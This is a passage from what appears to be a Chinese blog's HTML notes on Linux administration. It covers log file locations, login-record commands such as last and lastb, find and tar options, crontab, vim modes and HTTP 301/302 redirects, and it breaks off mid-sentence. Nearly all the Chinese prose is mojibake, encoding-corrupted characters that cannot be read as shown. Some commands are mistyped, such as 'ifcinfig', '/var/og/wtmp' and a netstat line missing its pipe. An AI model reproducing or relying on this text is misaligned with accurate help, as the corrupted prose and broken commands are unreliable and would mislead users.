æ­¤å¤–,å½“ä¸»æœºé­å—æ”»å‡»æ—¶,æ—¥å¿—æ–‡ä»¶è¿˜å¯ä»¥å¸®åŠ©å¯»æ‰¾æ”»å‡»è€…ç•™ä¸‹çš„ç—•è¿¹ã€‚</span><br></pre></td></tr></table></figure><p><strong>Linuxç³»ç»Ÿæœ¬èº«å’Œå¤§éƒ¨åˆ†æœåŠ¡å™¨ç¨‹åºçš„æ—¥å¿—æ–‡ä»¶é»˜è®¤æ”¾åœ¨&#x2F;var&#x2F;log&#x2F;ä¸‹</strong></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/v2-a298559e05d7b6be063b84717f6db6f1_1440w.webp" style="zoom: 67%;" /><p><strong>ç”¨æˆ·æ—¥å¿—ï¼š</strong></p><p>å­˜æ”¾ä½ç½®: &#x2F;var&#x2F;og&#x2F;wtmp. &#x2F;var&#x2F;log&#x2F;btmpã€ &#x2F;var&#x2F;log&#x2F;lastlog</p><p><strong>æŸ¥è¯¢å‘½ä»¤: usersã€whoã€wã€lastã€ lastlogã€ lastbç­‰</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Â userså‘½ä»¤:åªæ˜¯ç®€å•çš„è¾“å‡ºå½“å‰ç™»å½•çš„ç”¨æˆ·å, æ¯ä¸ªæ˜¾ç¤ºçš„ç”¨æˆ·åå¯¹åº”ä¸€ä¸ªä¼šè¯ã€‚</span><br><span class="line">Â whoå‘½ä»¤:æŠ¥å‘Šå½“å‰ç™»å½•åˆ°ç³»ç»Ÿçš„æ¯ä¸ªç”¨æˆ·çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·åï¼Œç»ˆç«¯ï¼Œç™»å½•æ—¥æœŸï¼Œè¿œç¨‹ä¸»æœº</span><br><span class="line">Â wå‘½ä»¤ï¼š æ˜¾ç¤ºå½“å‰æ“ä½œç³»ç»Ÿçš„æ¯ä¸ªç”¨æˆ·åŠå…¶è¿œç¨‹æ‰€è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯</span><br><span class="line">Â lastå‘½ä»¤:ç”¨äºæŸ¥è¯¢æˆåŠŸç™»å½•åˆ°ç³»ç»Ÿçš„ç”¨æˆ·è®°å½•,æœ€è¿‘çš„ç™»å½•æƒ…å†µåœ¨æœ€å‰é¢ã€‚ é€šè¿‡lastå‘½ä»¤å¯ä»¥åŠæ—¶æŒæ¡Linuxä¸»æœºçš„ç™»å½•æƒ…å†µ,è‹¥å‘ç°æœªç»æˆæƒçš„ç”¨æˆ·ç™»é™†è¿‡,åˆ™è¡¨ç¤ºå½“å‰ä¸»æœºå¯èƒ½å·²è¢«å…¥ä¾µã€‚ </span><br><span class="line">Â &#123;</span><br><span class="line">Â -a  :æŠŠä»ä½•å¤„ç™»å½•ç³»ç»Ÿçš„ä¸»æœºåç§°æˆ–IPåœ°å€,æ˜¾ç¤ºåœ¨æœ€åä¸€è¡Œ </span><br><span class="line">Â -d :å°†IPåœ°å€è½¬æ¢æˆä¸»æœºåç§° </span><br><span class="line">Â -f è®°å½•æ–‡ä»¶</span><br><span class="line">Â ] :æŒ‡å®šè®°å½•æ–‡ä»¶ </span><br><span class="line">Â -R  :ä¸æ˜¾ç¤ºç™»å…¥ç³»ç»Ÿçš„ä¸»æœºåç§°æˆ–IPåœ°å€ </span><br><span class="line">Â -x :æ˜¾ç¤ºç³»ç»Ÿå…³é—­,é‡æ–°å¼€æœº,ä»¥åŠæ‰§è¡Œç­‰çº§çš„æ”¹å˜ç­‰ </span><br><span class="line">Â -n : nä»£è¡¨æ•°å­—,è¡¨ç¤ºæœ€è¿‘næ¬¡ç™»å½•çš„è®°å½•</span><br><span class="line">Â &#125;</span><br><span class="line">Â lastlogå‘½ä»¤:ç”¨äºæ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€è¿‘ä¸€æ¬¡ç™»å½•ä¿¡æ¯</span><br><span class="line">Â lastbå‘½ä»¤:ç”¨äºæ˜¾æ˜¾ç”¨æˆ·é”™è¯¯çš„ç™»å½•åˆ—è¡¨,æ­¤æŒ‡ä»¤å¯ä»¥å‘ç°ç³»ç»Ÿçš„ç™»å½•å¼‚å¸¸ã€‚å¦‚ç™»å½•çš„ç”¨æˆ·åé”™è¯¯,å¯†ç ä¸æ­£ç¡®ç­‰æƒ…å†µéƒ½ä¼šè®°å½•åœ¨æ¡ˆ,ç™»å½•å¤±è´¥çš„æƒ…å†µå±äºå®‰å…¨äº‹ä»¶,å› æ­¤æ¶ˆå¤±å¯èƒ½æœ‰äººåœ¨å°è¯•ç ´è§£å¯†ç ã€‚é™¤äº†ä½¿ç”¨lastbå‘½ä»¤ä»¥å¤–,å¯ä»¥ç›´æ¥ä»å®‰å…¨æ—¥å¿—æ–‡ä»¶/var/log/secureä¸­è·å¾—ç›¸å…³ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><p>windowsç³»ç»Ÿä¸‹çš„apacheæ—¥å¿—ç›®å½•</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027203802404-1024x713.png" style="zoom:50%;" /><h6 id="nginxï¼ˆddï¼‰"><a href="#nginxï¼ˆddï¼‰" class="headerlink" title="nginxï¼ˆddï¼‰"></a>nginxï¼ˆddï¼‰</h6><h2 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h2><h5 id="å¸¸è§å‘½ä»¤"><a href="#å¸¸è§å‘½ä»¤" class="headerlink" title="å¸¸è§å‘½ä»¤"></a>å¸¸è§å‘½ä»¤</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Â ls:åˆ—å‡ºç›®å½• Â  &#123;ls -l  -ã€‹ ll&#125;</span><br><span class="line">Â cdï¼šåˆ‡æ¢ç›®å½• Â  </span><br><span class="line">Â pwdï¼šæ˜¾ç¤ºå½“å‰ç›®å½•</span><br><span class="line">Â mkdirï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç›®å½•</span><br><span class="line">Â rmdirï¼šåˆ é™¤ä¸€ä¸ªç©ºçš„ç›®å½•</span><br><span class="line">Â cpï¼šå¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">Â rmï¼šç§»é™¤æ–‡ä»¶æˆ–ç›®å½•</span><br></pre></td></tr></table></figure><h5 id="æŸ¥çœ‹å½“å‰ç”¨æˆ·"><a href="#æŸ¥çœ‹å½“å‰ç”¨æˆ·" class="headerlink" title="æŸ¥çœ‹å½“å‰ç”¨æˆ·"></a>æŸ¥çœ‹å½“å‰ç”¨æˆ·</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â whoami</span><br></pre></td></tr></table></figure><h5 id="æŸ¥çœ‹ipç­‰ä¿¡æ¯"><a href="#æŸ¥çœ‹ipç­‰ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹ipç­‰ä¿¡æ¯"></a>æŸ¥çœ‹ipç­‰ä¿¡æ¯</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Â ifcinfig Â  Â  Â   //æŸ¥è¯¢å’Œé…ç½®ç½‘ç»œæ¥å£</span><br><span class="line">Â hostname -I  // æ˜¾ç¤ºä¸»æœºåip</span><br><span class="line">Â ip addr show  //æŸ¥çœ‹ipv4ï¼Œipv6åœ°å€</span><br></pre></td></tr></table></figure><h5 id="æ˜¾ç¤ºå½“å‰ä½ç½®è·¯å¾„"><a href="#æ˜¾ç¤ºå½“å‰ä½ç½®è·¯å¾„" class="headerlink" title="æ˜¾ç¤ºå½“å‰ä½ç½®è·¯å¾„"></a>æ˜¾ç¤ºå½“å‰ä½ç½®è·¯å¾„</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â   pwd Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  //æ˜¾ç¤ºå½“å‰ä½ç½®è·¯å¾„</span><br></pre></td></tr></table></figure><h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Â find . -name &quot;*.c&quot; Â  Â  //å°†ç›®å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æ‰€æœ‰å»¶ä¼¸æ¡£åæ˜¯ c çš„æ–‡ä»¶åˆ—å‡ºæ¥</span><br><span class="line">Â find . -type f Â  Â  Â  Â  //å°†ç›®å‰ç›®å½•å…¶å…¶ä¸‹å­ç›®å½•ä¸­æ‰€æœ‰ä¸€èˆ¬æ–‡ä»¶åˆ—å‡º</span><br><span class="line">Â find . -ctime -20 Â  Â  Â //å°†ç›®å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æ‰€æœ‰æœ€è¿‘ 20 å¤©å†…æ›´æ–°è¿‡çš„æ–‡ä»¶åˆ—å‡º</span><br><span class="line">Â find /var/log -type f -mtime +7 -ok rm &#123;&#125; \; Â  Â  //æŸ¥æ‰¾/var/logç›®å½•ä¸­æ›´æ”¹æ—¶é—´åœ¨7æ—¥ä»¥å‰çš„æ™®é€šæ–‡ä»¶ï¼Œå¹¶åœ¨åˆ é™¤ä¹‹å‰è¯¢é—®å®ƒä»¬</span><br><span class="line">Â find . -type f -perm 644 -exec ls -l &#123;&#125; \; Â  Â  Â  //æŸ¥æ‰¾å‰ç›®å½•ä¸­æ–‡ä»¶å±ä¸»å…·æœ‰è¯»ã€å†™æƒé™ï¼Œå¹¶ä¸”æ–‡ä»¶æ‰€å±ç»„çš„ç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·å…·æœ‰è¯»æƒé™çš„æ–‡ä»¶</span><br><span class="line">Â find / -type f -size 0 -exec ls -l &#123;&#125; \; Â  Â  Â  Â  //ä¸ºäº†æŸ¥æ‰¾ç³»ç»Ÿä¸­æ‰€æœ‰æ–‡ä»¶é•¿åº¦ä¸º0çš„æ™®é€šæ–‡ä»¶ï¼Œå¹¶åˆ—å‡ºå®ƒä»¬çš„å®Œæ•´è·¯å¾„</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Â å‚æ•°è¯´æ˜ :</span><br><span class="line">Â #åˆ¤æ–­è§„åˆ™</span><br><span class="line">Â find æ ¹æ®ä¸‹åˆ—è§„åˆ™åˆ¤æ–­ path å’Œ expressionï¼Œåœ¨å‘½ä»¤åˆ—ä¸Šç¬¬ä¸€ä¸ª - ( ) , ! ä¹‹å‰çš„éƒ¨ä»½ä¸º pathï¼Œä¹‹åçš„æ˜¯ expressionã€‚å¦‚æœ path æ˜¯ç©ºå­—ä¸²åˆ™ä½¿ç”¨ç›®å‰è·¯å¾„ï¼Œå¦‚æœ expression æ˜¯ç©ºå­—ä¸²åˆ™ä½¿ç”¨ -print ä¸ºé¢„è®¾ expressionã€‚</span><br><span class="line">Â #expression</span><br><span class="line">Â expression ä¸­å¯ä½¿ç”¨çš„é€‰é¡¹æœ‰äºŒä¸‰åä¸ªä¹‹å¤šï¼Œåœ¨æ­¤åªä»‹ç»æœ€å¸¸ç”¨çš„éƒ¨ä»½ã€‚</span><br><span class="line">Â -mount, -xdev : åªæ£€æŸ¥å’ŒæŒ‡å®šç›®å½•åœ¨åŒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸‹çš„æ–‡ä»¶ï¼Œé¿å…åˆ—å‡ºå…¶å®ƒæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶</span><br><span class="line">Â -amin n : åœ¨è¿‡å» n åˆ†é’Ÿå†…è¢«è¯»å–è¿‡</span><br><span class="line">Â -anewer file : æ¯”æ–‡ä»¶ file æ›´æ™šè¢«è¯»å–è¿‡çš„æ–‡ä»¶</span><br><span class="line">Â -atime n : åœ¨è¿‡å» n å¤©å†…è¢«è¯»å–è¿‡çš„æ–‡ä»¶</span><br><span class="line">Â -cmin n : åœ¨è¿‡å» n åˆ†é’Ÿå†…è¢«ä¿®æ”¹è¿‡</span><br><span class="line">Â -cnewer file :æ¯”æ–‡ä»¶ file æ›´æ–°çš„æ–‡ä»¶</span><br><span class="line">Â -ctime n : åœ¨è¿‡å» n å¤©å†…åˆ›å»ºçš„æ–‡ä»¶</span><br><span class="line">Â -mtime n : åœ¨è¿‡å» n å¤©å†…ä¿®æ”¹è¿‡çš„æ–‡ä»¶</span><br><span class="line">Â -empty : ç©ºçš„æ–‡ä»¶-gid n or -group name : gid æ˜¯ n æˆ–æ˜¯ group åç§°æ˜¯ name</span><br><span class="line">Â -ipath p, -path p : è·¯å¾„åç§°ç¬¦åˆ p çš„æ–‡ä»¶ï¼Œipath ä¼šå¿½ç•¥å¤§å°å†™</span><br><span class="line">Â -name name, -iname name : æ–‡ä»¶åç§°ç¬¦åˆ name çš„æ–‡ä»¶ã€‚iname ä¼šå¿½ç•¥å¤§å°å†™</span><br><span class="line">Â -size n : æ–‡ä»¶å¤§å° æ˜¯ n å•ä½ï¼Œb ä»£è¡¨ 512 ä½å…ƒç»„çš„åŒºå—ï¼Œc è¡¨ç¤ºå­—å…ƒæ•°ï¼Œk è¡¨ç¤º kilo bytesï¼Œw æ˜¯äºŒä¸ªä½å…ƒç»„ã€‚</span><br><span class="line">Â #å…³äºæ–‡ä»¶ç±»å‹</span><br><span class="line">Â -type c : æ–‡ä»¶ç±»å‹æ˜¯ c çš„æ–‡ä»¶ã€‚</span><br><span class="line">Â d: ç›®å½•</span><br><span class="line">Â c: å­—å‹è£…ç½®æ–‡ä»¶</span><br><span class="line">Â b: åŒºå—è£…ç½®æ–‡ä»¶</span><br><span class="line">Â p: å…·åè´®åˆ—</span><br><span class="line">Â f: ä¸€èˆ¬æ–‡ä»¶</span><br><span class="line">Â l: ç¬¦å·è¿ç»“</span><br><span class="line">Â s: socket</span><br><span class="line">Â #pid</span><br><span class="line">Â -pid n : process id æ˜¯ n çš„æ–‡ä»¶</span><br><span class="line">Â #åˆ†å‰²è¿ç®—ç¬¦</span><br><span class="line">Â ä½ å¯ä»¥ä½¿ç”¨ ( ) å°†è¿ç®—å¼åˆ†éš”ï¼Œå¹¶ä½¿ç”¨ä¸‹åˆ—è¿ç®—ã€‚</span><br><span class="line">Â exp1 -and exp2</span><br><span class="line">Â ! expr</span><br><span class="line">Â -not expr</span><br><span class="line">Â exp1 -or exp2</span><br><span class="line">Â exp1, exp2</span><br></pre></td></tr></table></figure><h5 id="ç³»ç»Ÿä¿¡æ¯ï¼ˆ-ï¼‰"><a href="#ç³»ç»Ÿä¿¡æ¯ï¼ˆ-ï¼‰" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯ï¼ˆ*ï¼‰"></a>ç³»ç»Ÿä¿¡æ¯ï¼ˆ*ï¼‰</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Â uname -a Â   //å¯ä»¥æ˜¾ç¤ºä¸€äº›é‡è¦çš„ç³»ç»Ÿä¿¡æ¯ï¼Œä¾‹å¦‚å†…æ ¸åç§°ã€ä¸»æœºåã€å†…æ ¸ç‰ˆæœ¬å·ã€å¤„ç†å™¨ç±»å‹ä¹‹ç±»çš„ä¿¡æ¯</span><br><span class="line">Â ps -ef Â  Â  Â  Â  //æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</span><br><span class="line">Â ps -aux Â  Â  //æ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·æ‰“å¼€çš„è¿›ç¨‹,åŒ…æ‹¬æ— æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹ Â  å…¶ä¸­æœ‰å…¶ä»–ç”¨æˆ·çš„command</span><br><span class="line">Â ping IP Â  Â  Â   //æŸ¥çœ‹ä¸æ­¤IPåœ°å€çš„è¿æ¥æƒ…å†µ</span><br><span class="line">Â netstat -an Â   //æŸ¥çœ‹å½“å‰ç³»ç»Ÿç«¯å£</span><br><span class="line">Â netstat -an  grep 8080 Â  Â  //æŸ¥çœ‹æŒ‡å®šç«¯å£</span><br></pre></td></tr></table></figure><h5 id="è§£å‹ç¼©å‘½ä»¤"><a href="#è§£å‹ç¼©å‘½ä»¤" class="headerlink" title="è§£å‹ç¼©å‘½ä»¤"></a>è§£å‹ç¼©å‘½ä»¤</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Â # å‹ç¼©æ–‡ä»¶ file1 æˆ–ç›®å½• dir2 åˆ° test.tar.gz</span><br><span class="line">Â tar -zcvf filename.tar.gz file1/dir2</span><br><span class="line">Â # è§£å‹ test.tar.gzï¼ˆå°† c æ¢æˆ x å³å¯ï¼‰</span><br><span class="line">Â tar -zxvf test.tar.gz</span><br><span class="line">Â # åˆ—å‡ºå‹ç¼©æ–‡ä»¶çš„å†…å®¹</span><br><span class="line">Â tar -ztvf test.tar.gz </span><br></pre></td></tr></table></figure><p><strong>å‚æ•°</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Â  Â   -z -&gt; ä½¿ç”¨ gzip æ¥å‹ç¼©å’Œè§£å‹æ–‡ä»¶</span><br><span class="line">Â  Â   -v -&gt; --verbose è¯¦ç»†çš„åˆ—å‡ºå¤„ç†çš„æ–‡ä»¶</span><br><span class="line">Â  Â   -f -&gt; --file=ARCHIVE ä½¿ç”¨æ¡£æ¡ˆæ–‡ä»¶æˆ–è®¾å¤‡ï¼Œè¿™ä¸ªé€‰é¡¹é€šå¸¸æ˜¯å¿…é€‰çš„</span><br><span class="line">Â  Â   -c -&gt; --create åˆ›å»ºä¸€ä¸ªæ–°çš„å½’æ¡£ï¼ˆå‹ç¼©åŒ…ï¼‰</span><br><span class="line">Â  Â   -x -&gt; ä»å‹ç¼©åŒ…ä¸­è§£å‡ºæ–‡ä»¶</span><br></pre></td></tr></table></figure><h5 id="è®¡åˆ’ä»»åŠ¡-dd"><a href="#è®¡åˆ’ä»»åŠ¡-dd" class="headerlink" title="è®¡åˆ’ä»»åŠ¡(dd)"></a>è®¡åˆ’ä»»åŠ¡(dd)</h5><p><strong>è®¡åˆ’ä»»åŠ¡ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§ä½¿ç”¨æƒ…å†µ:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â 1.ç³»ç»Ÿçº§åˆ«çš„å®šæ—¶ä»»åŠ¡ï¼š ä¸´æ—¶æ–‡ä»¶æ¸…ç†ã€ç³»ç»Ÿä¿¡æ¯é‡‡é›†ã€æ—¥å¿—æ–‡ä»¶åˆ‡å‰²</span><br><span class="line">Â 2.ç”¨æˆ·çº§åˆ«çš„å®šæ—¶ä»»åŠ¡ï¼š å®šæ—¶å‘äº’è”ç½‘åŒæ­¥æ—¶é—´ã€å®šæ—¶å¤‡ä»½ç³»ç»Ÿé…ç½®æ–‡ä»¶ã€å®šæ—¶å¤‡ä»½æ•°æ®åº“çš„æ•°æ®</span><br></pre></td></tr></table></figure><p><strong>crontab</strong>æ˜¯Linuxç”¨æ¥å®šæœŸæ‰§è¡Œç¨‹åºçš„å‘½ä»¤ã€‚</p><p>crond å‘½ä»¤æ¯åˆ†é’Ÿä¼šå®šæœŸæ£€æŸ¥æ˜¯å¦æœ‰è¦æ‰§è¡Œçš„å·¥ä½œï¼Œå¦‚æœæœ‰è¦æ‰§è¡Œçš„å·¥ä½œä¾¿ä¼šè‡ªåŠ¨æ‰§è¡Œè¯¥å·¥ä½œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â crondä¸»è¦æ˜¯åšä¸€äº›å‘¨æœŸæ€§çš„ä»»åŠ¡ï¼Œæ¯”å¦‚: å‡Œæ™¨3ç‚¹å®šæ—¶å¤‡ä»½æ•°æ®ã€‚æ¯”å¦‚ï¼š11ç‚¹å¼€å¯ç½‘ç«™æŠ¢è´­æ¥å£ï¼Œ12ç‚¹å…³é—­ç½‘ç«™æŠ¢è´­æ¥å£ã€‚</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼š</strong>æ–°åˆ›å»ºçš„ cron ä»»åŠ¡ï¼Œä¸ä¼šé©¬ä¸Šæ‰§è¡Œï¼Œè‡³å°‘è¦è¿‡ 2 åˆ†é’Ÿåæ‰å¯ä»¥ï¼Œå½“ç„¶ä½ å¯ä»¥é‡å¯ cron æ¥é©¬ä¸Šæ‰§è¡Œ</p><h5 id="vimç¼–è¾‘"><a href="#vimç¼–è¾‘" class="headerlink" title="vimç¼–è¾‘"></a>vimç¼–è¾‘</h5><p>åŸºæœ¬ä¸Š vi&#x2F;vim å…±åˆ†ä¸ºä¸‰ç§æ¨¡å¼ï¼Œåˆ†åˆ«æ˜¯<strong>å‘½ä»¤æ¨¡å¼ï¼ˆCommand modeï¼‰</strong>ï¼Œ<strong>è¾“å…¥æ¨¡å¼ï¼ˆInsert modeï¼‰</strong>å’Œ<strong>åº•çº¿å‘½ä»¤æ¨¡å¼ï¼ˆLast line modeï¼‰</strong>ã€‚</p><p><strong>å‘½ä»¤æ¨¡å¼</strong></p><p>ç”¨æˆ·åˆšåˆšå¯åŠ¨ vi&#x2F;vimï¼Œä¾¿è¿›å…¥äº†å‘½ä»¤æ¨¡å¼ã€‚æ­¤çŠ¶æ€ä¸‹æ•²å‡»é”®ç›˜åŠ¨ä½œä¼šè¢«Vimè¯†åˆ«ä¸ºå‘½ä»¤ï¼Œè€Œéè¾“å…¥å­—ç¬¦ã€‚</p><p><strong>å¸¸è§å‘½ä»¤</strong></p><ul><li><strong>i</strong> åˆ‡æ¢åˆ°è¾“å…¥æ¨¡å¼ï¼Œä»¥è¾“å…¥å­—ç¬¦ã€‚</li><li><strong>x</strong> åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨å¤„çš„å­—ç¬¦ã€‚</li><li><strong>:</strong> åˆ‡æ¢åˆ°åº•çº¿å‘½ä»¤æ¨¡å¼ï¼Œä»¥åœ¨æœ€åº•ä¸€è¡Œè¾“å…¥å‘½ä»¤ã€‚</li><li>è‹¥è¦ç¼–è¾‘æ–‡æœ¬ï¼Œè¿›å…¥å‘½ä»¤æ¨¡å¼åï¼ŒæŒ‰ä¸‹iï¼Œåˆ‡æ¢åˆ°è¾“å…¥æ¨¡å¼</li></ul><p><strong>è¾“å…¥æ¨¡å¼</strong></p><ul><li><strong>å­—ç¬¦æŒ‰é”®ä»¥åŠShiftç»„åˆ</strong>ï¼Œè¾“å…¥å­—ç¬¦</li><li><strong>ENTER</strong>ï¼Œå›è½¦é”®ï¼Œæ¢è¡Œ</li><li><strong>BACK SPACE</strong>ï¼Œé€€æ ¼é”®ï¼Œåˆ é™¤å…‰æ ‡å‰ä¸€ä¸ªå­—ç¬¦</li><li><strong>ESC</strong>ï¼Œé€€å‡ºè¾“å…¥æ¨¡å¼ï¼Œåˆ‡æ¢åˆ°å‘½ä»¤æ¨¡å¼</li></ul><p>ç¼–è¾‘æ–‡æœ¬ä¸»è¦æ˜¯ç°åœ¨è¿™ä¸ªæ¨¡å¼ï¼Œvimæ¯”viå‡çº§å¾ˆå¤šï¼ŒåŸºæœ¬ä¸Šç¼–è¾‘å’Œä¸€èˆ¬çš„æ–‡æœ¬ç¼–è¾‘å·®ä¸å¤š</p><p><strong>åº•çº¿å‘½ä»¤æ¨¡å¼</strong></p><p>åœ¨å‘½ä»¤æ¨¡å¼ä¸‹æŒ‰ä¸‹:ï¼ˆè‹±æ–‡å†’å·ï¼‰å°±è¿›å…¥äº†åº•çº¿å‘½ä»¤æ¨¡å¼</p><p>å¸¸ç”¨å‘½ä»¤ï¼ˆå¿½ç•¥å†’å·ï¼‰</p><p><code>q</code> ï¼šé€€å‡ºç¨‹åº</p><p><code>w</code> ï¼šä¿å­˜æ–‡ä»¶</p><p>ä¸€èˆ¬ç¼–è¾‘è¿‡åç›´æ¥ ï¼šwq ç„¶åå›è½¦</p><p>æŒ‰<strong>ESC</strong>é”®å¯éšæ—¶é€€å‡ºåº•çº¿å‘½ä»¤æ¨¡å¼</p><h2 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a>é‡å®šå‘</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â é‡å®šå‘(Redirect)å°±æ˜¯é€šè¿‡å„ç§æ–¹æ³•å°†å„ç§ç½‘ç»œè¯·æ±‚é‡æ–°å®šä¸ªæ–¹å‘è½¬åˆ°å…¶å®ƒä½ç½®ï¼ˆå¦‚ï¼šç½‘é¡µé‡å®šå‘ã€åŸŸåçš„é‡å®šå‘ã€è·¯ç”±é€‰æ‹©çš„å˜åŒ–ä¹Ÿæ˜¯å¯¹æ•°æ®æŠ¥æ–‡ç»ç”±è·¯å¾„çš„ä¸€ç§é‡å®šå‘ï¼‰ã€‚</span><br></pre></td></tr></table></figure><h3 id="é‡å®šå‘-HTTP-çŠ¶æ€ç "><a href="#é‡å®šå‘-HTTP-çŠ¶æ€ç " class="headerlink" title="é‡å®šå‘ HTTP çŠ¶æ€ç "></a><strong>é‡å®šå‘ HTTP çŠ¶æ€ç </strong></h3><p>å’Œé‡å®šå‘æœ‰å…³çš„ HTTP çŠ¶æ€ç ä¸»è¦æ˜¯ 301ã€302ã€303ã€307ã€308ï¼Œæœ€å¸¸ç”¨çš„æ˜¯ 301 å’Œ 302ï¼Œå¯ä»¥çœ‹çœ‹ MDN å®˜æ–¹å¯¹å®ƒä»¬çš„è§£é‡Šã€‚</p><p>301 æ˜¯æ°¸ä¹…é‡å®šå‘ï¼ˆMoved Permanentlyï¼‰è¯´æ˜è¯·æ±‚çš„èµ„æºå·²ç»è¢« <strong>æ°¸ä¹…</strong> ç§»åŠ¨åˆ°äº†ç”± Location å¤´éƒ¨æŒ‡å®šçš„ url ä¸Šï¼Œæ˜¯å›ºå®šçš„ä¸ä¼šå†æ”¹å˜ï¼Œæœç´¢å¼•æ“ä¼šæ ¹æ®è¯¥å“åº”ä¿®æ­£ã€‚</p><p>è€Œ 302 æ˜¯æš‚æ—¶æ€§è½¬ç§»ï¼ˆMoved Temporarilyï¼Œæˆ–è€… Foundï¼‰ï¼Œè¡¨æ˜è¯·æ±‚çš„èµ„æºè¢« <strong>æš‚æ—¶</strong> ç§»åŠ¨åˆ°äº†ç”± Location å¤´éƒ¨æŒ‡å®šçš„ URL ä¸Šã€‚æµè§ˆå™¨ä¼šé‡å®šå‘åˆ°è¿™ä¸ª URLï¼Œ ä½†æ˜¯æœç´¢å¼•æ“ä¸ä¼šå¯¹è¯¥èµ„æºçš„é“¾æ¥è¿›è¡Œæ›´æ–°ã€‚</p><p>è™½ç„¶ 301 å’Œ 302 éƒ½èƒ½å¤Ÿå°†ç”¨æˆ·è¾“å…¥çš„ç½‘å€ Aï¼Œ æ”¹ä¸ºé‡å®šå‘åçš„ç½‘å€ Bï¼Œä½†ä»–ä»¬è¿˜æ˜¯æœ‰åŒºåˆ«çš„ï¼š</p><ul><li>æœç´¢å¼•æ“åŒºåˆ«ï¼š301 è¡¨ç¤ºåŸåœ°å€ A çš„èµ„æºå·²è¢«ç§»é™¤ï¼Œæ°¸è¿œæ— æ³•è®¿é—®ï¼Œæœç´¢å¼•æ“æŠ“å†…å®¹æ—¶ä¼šå°†ç½‘å€ A å…¨éƒ¨æ›¿æ¢ä¸º Bï¼›è€Œ 302 è¡¨ç¤ºç½‘å€ A 